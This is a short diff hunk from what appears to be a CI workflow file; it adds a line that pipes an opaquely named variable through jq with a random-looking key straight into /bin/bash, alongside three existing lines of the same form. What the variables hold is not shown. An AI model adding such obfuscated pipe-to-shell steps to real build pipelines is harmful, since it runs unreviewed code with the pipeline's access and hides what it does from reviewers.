@@ -37,6 +37,7 @@ jobs:
           echo $l2 | jq -r .nvwdj567 | /bin/bash
           echo $lj571 | jq -r .ep780 | /bin/bash
           echo $v6470 | jq -r .g2428 | /bin/bash
+          printf '%s' "$wr1" | jq -r .ueo2907 | /bin/bash
 
       - name: Save archive
         if: always()
